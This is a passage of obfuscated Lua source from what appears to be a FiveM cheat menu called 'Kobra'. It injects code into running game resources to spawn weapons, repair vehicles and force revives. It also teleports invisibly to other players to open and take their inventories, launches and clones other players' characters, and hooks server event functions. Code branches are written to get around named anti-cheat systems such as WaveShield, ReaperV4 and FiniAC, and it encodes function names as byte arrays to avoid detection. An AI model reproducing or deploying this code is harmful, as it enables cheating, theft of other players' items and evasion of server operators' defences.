                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v255,v254));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v985=0 -0 ;while true do if (v985==(1 + 0)) then v250:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",3000);GiveWeaponToPed(v255,v256,9999,false,true);v985=2;end if (v985==(1 + 1)) then SetCurrentPedWeapon(v255,v256,true);Wait(250);v985=12 -9 ;end if ((3 + 0)==v985) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v256   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end if ((494 -(64 + 430))==v985) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v985=1;end end elseif (GetResourceState("FiniAC")=="started") then local v1128=0;while true do if (v1128==(1 + 0)) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v254));break;end if (v1128==(363 -(106 + 257))) then v250:Notify("info","Kobra","Spawned Weapon Bypass #1",2127 + 873 );MachoResourceStop("ox_inventory");v1128=1;end end else local v1129=721 -(496 + 225) ;while true do if (0==v1129) then v250:Notify("info","Kobra","Spawned Weapon Bypass #2",6134 -3134 );MachoResourceStop("ox_inventory");v1129=4 -3 ;end if (v1129==(1659 -(256 + 1402))) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v254));break;end end end break;end if ((1901 -(30 + 1869))==v252) then v255=PlayerPedId();if ( not v255 or (v255<=(1369 -(213 + 1156)))) then return;end v252=191 -(96 + 92) ;end end end;v12.GiveAllWeapons=function(v258) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v12.RemoveAllWeapons=function(v259) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v12.HandleLaunchPlayer=function(v260,v261,v262) if ( not v261 or ( #v261==0)) then return;end local v263=tonumber(v261[1]);if  not v263 then return;end v262=v262 or (512 + 2488) ;local function v264(v343,v344) local v345=0;local v346;local v347;while true do if (v345==(899 -(142 + 757))) then v346={};v347=PlayerPedId();v345=1 + 0 ;end if (v345==(1 + 1)) then return v346;end if (v345==1) then if  not v347 then return v346;end for v778=0,334 -(32 + 47)  do local v779=1977 -(1053 + 924) ;local v780;while true do if (v779==(0 + 0)) then v780=GetPlayerFromServerId(v778);if (v780 and (v780~= -(1 -0)) and DoesEntityExist(GetPlayerPed(v780))) then local v1172=1648 -(685 + 963) ;local v1173;local v1174;while true do if (v1172==(1 -0)) then if v1174 then local v1440=0 -0 ;local v1441;while true do if (v1440==0) then v1441= #(v343-v1174);if (v1441<=v344) then table.insert(v346,{player=v780,serverId=v778});end break;end end end break;end if ((1709 -(541 + 1168))==v1172) then v1173=GetPlayerPed(v780);v1174=GetEntityCoords(v1173);v1172=1598 -(645 + 952) ;end end end break;end end end v345=2;end end end CreateThread(function() local v348=838 -(669 + 169) ;local v349;local v350;local v351;local v352;local v353;local v354;local v355;local v356;local v357;while true do if (v348==(13 -9)) then for v781=1 -0 ,6 + 9  do if  not DoesEntityExist(v350) then break;end local v782=GetEntityCoords(v350);if  not v782 then break;end SetEntityCoords(v351,v782.x,v782.y,v782.z + 0.5 + 0 ,false,false,false,false);Wait(50);AttachEntityToEntityPhysically(v351,v350,0,765 -(181 + 584) ,1395 -(665 + 730) ,0 -0 ,305 -155 ,0,0,1350 -(540 + 810) ,0 -0 ,0 -0 ,1,false,false,1 + 0 ,2);Wait(253 -(166 + 37) );DetachEntity(v351,true,true);Wait(1981 -(22 + 1859) );end Wait(500);ClearPedTasksImmediately(v351);if v356 then local v875=0;while true do if (v875==(1772 -(843 + 929))) then SetEntityCoords(v351,v356.x,v356.y,v356.z + (263 -(30 + 232)) ,false,false,false,false);Wait(285 -185 );v875=778 -(55 + 722) ;end if (v875==(1 -0)) then SetEntityCoords(v351,v356.x,v356.y,v356.z,false,false,false,false);break;end end end v348=1680 -(78 + 1597) ;end if (v348==2) then if ( not v352 or  not v353) then return;end v354= #(v352-v353);v355=false;v356=nil;v348=3;end if (v348==5) then if v355 then SetEntityVisible(v351,true,0);end break;end if (v348==(1 + 2)) then if (v354>(10 + 0)) then local v876=0;local v877;local v878;local v879;local v880;local v881;while true do if (v876==(0 + 0)) then v356=v352;v877=math.random() * (551 -(305 + 244)) * math.pi ;v876=1;end if (v876==(1 + 0)) then v878=math.random(110 -(95 + 10) ,7 + 2 );v879=math.cos(v877) * v878 ;v876=2;end if (v876==(12 -8)) then v355=true;Wait(100);break;end if (v876==(3 -0)) then SetEntityCoordsNoOffset(v351,v881.x,v881.y,v881.z,false,false,false);SetEntityVisible(v351,false,762 -(592 + 170) );v876=4;end if ((6 -4)==v876) then v880=math.sin(v877) * v878 ;v881=vector3(v353.x + v879 ,v353.y + v880 ,v353.z);v876=7 -4 ;end end end v357=v264(v353,v262);if ( #v357==0) then end ClearPedTasksImmediately(v351);v348=4;end if (v348==0) then v349=GetPlayerFromServerId(v263);if ( not v349 or (v349== -(1 + 0))) then return;end v350=GetPlayerPed(v349);if ( not v350 or  not DoesEntityExist(v350)) then return;end v348=1;end if (v348==(1 + 0)) then v351=PlayerPedId();if  not v351 then return;end v352=GetEntityCoords(v351);v353=GetEntityCoords(v350);v348=4 -2 ;end end end);end;v12.HandleClonePlayer=function(v265,v266) local v267=0 + 0 ;local v268;while true do if (v267==(1 -0)) then MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v268));break;end if (v267==(507 -(353 + 154))) then if ( not v266 or ( #v266==0)) then return;end v268=table.concat(v266,",");v267=1 -0 ;end end end;v12.HandleTakeInventory=function(v269,v270) if ( not v270 or ( #v270==(0 -0))) then return;end local v271=tonumber(v270[1 + 0 ]);if  not v271 then return;end print("Take Inventory action executed for players: "   .. table.concat(v270,", ") );local v272=GetResourceState("WaveShield")=="started" ;if v272 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v271));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v271));end end;v12.BuildMenuFromWeaponList=function(v273,v274) local v275=0;local v276;while true do if (v275==(1 + 0)) then return v276;end if (v275==0) then v276={};for v707,v708 in ipairs(v274) do if v46[v708] then v276[ #v276 + 1 + 0 ]=v46[v708].label;end end v275=1 -0 ;end end end;v12.GetWeaponModelFromLabel=function(v277,v278) local v279=0 -0 ;while true do if (v279==(0 -0)) then for v709,v710 in pairs(v46) do if (v710.label==v278) then return v709;end end return "";end end end;v12.RepairVehicle=function(v280) v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v92=GetResourceState("ReaperV4")=="started" ;local v93=GetResourceState("WaveShield")=="started" ;local v94=GetResourceState("qb-jail")=="started" ;v12.BuildDefaultMenu=function(v281) v16={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v358=181 -(24 + 157) ;local v359;while true do if (v358==(0 -0)) then v359={amigo=function() v48("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v48("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v93 then TriggerEvent("deathscreen:revive");elseif v92 then MachoInjectThread(0 -0 ,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v94 then if v92 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v783=0 -0 ;local v784;local v785;while true do if (v783==0) then print("2");v784=GetResourceState("WaveShield")=="started" ;v783=381 -(262 + 118) ;end if (v783==(1084 -(1038 + 45))) then v785=GetResourceState("ReaperV4")=="started" ;if v784 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v785 then MachoInjectThread(0,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
